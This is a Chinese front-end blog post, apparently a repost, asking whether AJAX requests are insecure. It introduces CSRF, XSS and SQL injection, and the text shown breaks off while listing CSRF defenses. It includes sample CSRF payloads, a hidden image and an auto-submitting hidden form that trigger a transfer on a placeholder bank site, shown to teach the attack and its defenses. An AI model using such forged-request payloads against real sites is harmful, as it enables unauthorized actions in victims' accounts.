<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hugo 0.51"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="initial-scale=1,width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no"><meta name="wap-font-scale" content="no"><meta name="360-site-verification" content="0903ba33c82867d1f7bd8831e32a7e34"><meta name="sogou_site_verification" content="E8uWFBcf4a"><meta name="author" content="Fan"><meta name="description" itemprop="description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta name="keywords" content="Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js"><meta property="og:locale" content="en_US"><meta property="og:title" content="AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。"><meta property="og:image" content="https://alili.tech/images/logo2.png"><meta property="og:description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta property="og:site_name" content="Alili"><title>AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!</title><link rel="shortcut icon" href="https://alili.tech/images/favicon.ico"><link rel="manifest" href="/manifest.json"><link rel="stylesheet" href="https://alili.tech/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://alili.tech/lib/justified-gallery/justifiedGallery.min.css"><link rel="stylesheet" href="https://alili.tech/css/style.css"><script src="https://alili.tech/lib/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="https://alili.tech/lib/jquery/jquery.min.js"></script><script>document.addEventListener("error", function (e) {
			  var elem = e.target;
			  if (elem.tagName.toLowerCase() == 'img') {
				elem.style.display='none'
			  }
			}, true);</script><script type="application/ld+json">{
				"@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
				"@id": "https://alili.tech/archive/eniq8yfn2vm/",
				"appid": "1613049289050283", 
				"title": "AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!", 
				"images": [],
				"pubDate": "2018-12-19T02:30:07"
			}</script></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="https://alili.tech/archive/hzdsvn98oar/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li><li><a class="icon" href="https://alili.tech/archive/9gb96bfwu0n/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li><li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li></ul><span id="i-prev" class="info" style="display:none;">Previous post</span> <span id="i-next" class="info" style="display:none;">Next post</span> <span id="i-top" class="info" style="display:none;">Back to top</span> <span id="i-share" class="info" style="display:none;">Share post</span></span><br><div id="share" style="display: none"><ul><li><a class="icon" href="http://v.t.sina.com.cn/share/share.php?u=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&text=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-weibo" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&text=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&title=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&is_video=false&description=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82&body=Check out this article: https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&title=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&title=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&title=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https%3a%2f%2falili.tech%2farchive%2feniq8yfn2vm%2f&title=AJAX%e8%af%b7%e6%b1%82%e7%9c%9f%e7%9a%84%e4%b8%8d%e5%ae%89%e5%85%a8%e4%b9%88%ef%bc%9f%e8%b0%88%e8%b0%88Web%e5%ae%89%e5%85%a8%e4%b8%8eAJAX%e7%9a%84%e5%85%b3%e7%b3%bb%e3%80%82"><i class="fa fa-digg" aria-hidden="true"></i></a></li></ul></div><div id="toc"><nav id="TableOfContents"><ul><li><a href="#版权声明">版权声明</a><ul><li><a href="#原文标题">原文标题</a></li><li><a href="#原文链接">原文链接</a></li></ul></li></ul></nav></div></span></div><div class="content index width mx-auto px3 my3"><section id="wrapper" class="home"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。</h1><div class="meta"><div class="postdate"><time datetime="2018-12-19" itemprop="datePublished">2018-12-19</time></div><div class="article-tag"><i class="fa fa-eye"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span></span></div><div class="article-tag-box"></div></div></header><div class="content" itemprop="articleBody"><div id="raw"><p style="opacity: 0;">Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js</p><script>$(function () {
            var html = "\n\n                    \n\x3ch2 id=\x22articleHeader0\x22\x3e开篇三问\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3eAJAX请求真的不安全么？\x3c\/li\x3e\n\x3cli\x3eAJAX请求哪里不安全？\x3c\/li\x3e\n\x3cli\x3e怎么样让AJAX请求更安全？\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader1\x22\x3e前言\x3c\/h2\x3e\n\x3cp\x3e本文包含的内容较多，包括AJAX，CORS，XSS，CSRF等内容，要完整的看完并理解需要付出一定的时间。\x3c\/p\x3e\n\x3cp\x3e\x3cem\x3e另外，见解有限，如有描述不当之处，请帮忙及时指出。\x3c\/em\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e正文开始...\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e从入坑前端开始，一直到现在，AJAX请求都是以极高的频率重复出现，也解决过不少AJAX中遇到的问题，如跨域调试，错误调试等等。\x3c\/p\x3e\n\x3cp\x3e从这种，发现了一个共通现象：\x3cstrong\x3e那就是每次和后台人员对接时，他们都会提到\x3ccode\x3eAJAX请求不安全\x3c\/code\x3e，请用普通http请求！\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e虽然很多时候，都是经过多翻口舌之争后，最终后台那边妥协，允许部分符合条件的AJAX请求。但是，我却很纠结一个问题：\x3cstrong\x3eAJAX请求真的不安全么？为什么我自己写后台时并没有发现这个问题？\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e于是，开始准备搜集资料，结合自己已有的认知，整理成一份解决方案，分析\x3ccode\x3eAJAX请求真的不安全么？哪里不安全？\x3c\/code\x3e，后续遇到类似的问题就直接\x3cstrong\x3e向对方抛出一篇文章\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader2\x22\x3e大纲\x3c\/h2\x3e\n\x3cul\x3e\n\x3cli\x3e\n\x3cp\x3eAJAX请求真的不安全么\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3eAJAX不安全的说法从何而来\x3c\/li\x3e\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e常见的几种Web前端安全问题\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3eCSRF简介\x3c\/li\x3e\n\x3cli\x3eCSRF与AJAX的关系\x3c\/li\x3e\n\x3cli\x3eXSS简介\x3c\/li\x3e\n\x3cli\x3eXSS与AJAX的关系\x3c\/li\x3e\n\x3cli\x3eSQL注入简介\x3c\/li\x3e\n\x3cli\x3eSQL注入与AJAX的关系\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3eAJAX和HTTP请求的区别\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3eCORS与AJAX安全性之间的关联\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3eCORS与AJAX关系的简介\x3c\/li\x3e\n\x3cli\x3e为什么要配置CORS？\x3c\/li\x3e\n\x3cli\x3eCORS会配置些什么信息？\x3c\/li\x3e\n\x3cli\x3eCORS \x3ccode\x3eOrigin: *\x3c\/code\x3e的安全性\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e再看，AJAX请求真的不安全么？\x3c\/li\x3e\n\x3cli\x3eAJAX请求哪里不安全？\x3c\/li\x3e\n\x3cli\x3e怎么样让AJAX请求更安全？\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3ch2 id=\x22articleHeader3\x22\x3eAJAX请求真的不安全么\x3c\/h2\x3e\n\x3cp\x3e首先，先说一个定论：\x3ccode\x3eAJAX请求是否安全，由服务端（后台）决定\x3c\/code\x3e\x3c\/p\x3e\n\x3cp\x3e有这样一个说法：\x3cstrong\x3e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693839?w=495\x26amp;h=601\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693839?w=495\x26amp;h=601\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer; display: inline;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e为何会有这种说法？\x3cstrong\x3e因为在Web应用中，客户端输入不可信是一个基本原则\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader4\x22\x3eAJAX不安全的说法从何而来？\x3c\/h3\x3e\n\x3cp\x3e在AJAX出现时，那时的服务端还是很古老的那一批，因此完全没有考虑到AJAX出现后，前端请求方式会变得异常复杂，造成以前的安全策略已经无法满足要求了，导致大批的后台安全漏洞曝光。。。\x3c\/p\x3e\n\x3cp\x3e很显然，都是因为AJAX出现后曝光了更多的安全漏洞，导致它看起来很危险（因为AJAX出现后，请求方式变多了，以前的架构在新的请求中就可能出现更多漏洞）\x3c\/p\x3e\n\x3cp\x3eSo，AJAX不安全的说法自然扩散到了各个角落。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader5\x22\x3e常见的几种Web前端安全问题\x3c\/h2\x3e\n\x3cp\x3e要知道AJAX请求是否安全，那么就得先知道Web前端中到底有那几种安全问题\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221.XSS（跨站脚本攻击）（cross-site scripting）\n\n    -\x3e 伪造会话（基于XSS实现CSRF）\n    \n    -\x3e 劫持cookie\n    \n    -\x3e 恶意代码执行\n\n2.CSRF（跨站请求伪造）（cross-site request forgery）\n\n    -\x3e 伪造用户身份操作\n    \n3. SQL注入\n\n...（其它暂且不提）\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3eXSS（跨站脚本攻击）（cross-site scripting）\n\n    -\x26gt; 伪造会话（基于XSS实现CSRF）\n    \n    -\x26gt; 劫持cookie\n    \n    -\x26gt; 恶意代码执行\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3eCSRF（跨站请求伪造）（cross-site request forgery）\n\n    -\x26gt; 伪造用户身份操作\n    \n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e SQL注入\n\n...（其它暂且不提）\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693782?w=803\x26amp;h=428\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693782?w=803\x26amp;h=428\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e如上，Web前端中的安全问题主要就是这几大类（仅列举部分做分析），所以我们首先要分析AJAX与这几大类之间的关系。（\x3ccode\x3eXSS\x3c\/code\x3e和\x3ccode\x3eCSRF\x3c\/code\x3e，在下文也会做简单介绍。）\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader6\x22\x3eCSRF简介\x3c\/h3\x3e\n\x3cp\x3eCSRF，特征很简单：\x3cstrong\x3e冒用用户身份，进行恶意操作\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e时至今日，这项安全漏洞已经被人们剖析的很透彻了，随便Google，百度之，都会找到很多的解释。这里也用一张图来先做简单描述：\x3c\/p\x3e\n\x3cp\x3e（注，下面介绍参考了来源文章中的描述，譬如图就是参考了来源中的博文后重绘的）\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693783?w=904\x26amp;h=739\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693783?w=904\x26amp;h=739\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e所以，我们看到关键条件是：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. 采用cookie来进行用户校验\n\n2. 登录受信任网站A，并在本地生成Cookie\n\n3. 在不登出A的情况下，访问危险网站B\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e 采用cookie来进行用户校验\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e 登录受信任网站A，并在本地生成Cookie\n\n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e 在不登出A的情况下，访问危险网站B\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e一般在\x3ccode\x3e(4)\x3c\/code\x3e处\x3ccode\x3e恶意网站(B)\x3c\/code\x3e的攻击手段如下（必须是指向\x3ccode\x3eA\x3c\/code\x3e的地址，否则无法带上cookie）：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\/\/ 1.譬如在网站内的图片资源中潜入恶意的转账操作\n\x3cimg src=http:\/\/www.bank.example\/transfer?toBankId=hello\x26amp;amount=1000000 width=\x270\x27 height=\x270\x27\x3e\n\n\/\/ 2.构建恶意的隐藏表单，并通过脚本提交恶意请求\n\x3ciframe style=\x26quot;display: none;\x26quot; name=\x26quot;csrf-frame\x26quot;\x3e\x3c\/iframe\x3e\n\x3cform method=\x27POST\x27 action=\x27http:\/\/www.bank.example\/transfer\x27 target=\x26quot;csrf-frame\x26quot; id=\x26quot;csrf-form\x26quot;\x3e\n  \x3cinput type=\x27hidden\x27 name=\x27toBankId\x27 value=\x27hello\x27\x3e\n  \x3cinput type=\x27hidden\x27 name=\x27amount\x27 value=\x271000000\x27\x3e\n  \x3cinput type=\x27submit\x27 value=\x27submit\x27\x3e\n\x3c\/form\x3e\n\x3cscript\x3edocument.getElementById(\x26quot;csrf-form\x26quot;).submit()\x3c\/script\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22xml hljs\x22\x3e\x3ccode class=\x22html\x22\x3e\/\/ 1.譬如在网站内的图片资源中潜入恶意的转账操作\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eimg\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3esrc\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3ehttp:\/\/www.bank.example\/transfer?toBankId\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3ehello\x26amp;amount\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e1000000\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ewidth\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x270\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eheight\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x270\x27\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\n\/\/ 2.构建恶意的隐藏表单，并通过脚本提交恶意请求\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eiframe\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3estyle\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22display: none;\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22csrf-frame\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3eiframe\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3emethod\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27POST\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eaction\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27http:\/\/www.bank.example\/transfer\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etarget\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22csrf-frame\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eid\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22csrf-form\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27hidden\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27toBankId\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27hello\x27\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27hidden\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27amount\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x271000000\x27\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27submit\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x27submit\x27\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22javascript\x22\x3e\x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.getElementById(\x3cspan class=\x22hljs-string\x22\x3e\x22csrf-form\x22\x3c\/span\x3e).submit()\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e而且，从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以\x3ccode\x3eHttpOnly\x3c\/code\x3e并不会影响这个攻击\x3c\/p\x3e\n\x3cp\x3e最后说下，几种常见的CSRF防御手段：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）\n（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。\n虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，\n亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）\n\n2. 在请求地址中添加token并验证\n（譬如post中，以参数的形式加入一个随机产生的token）\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e 验证HTTP 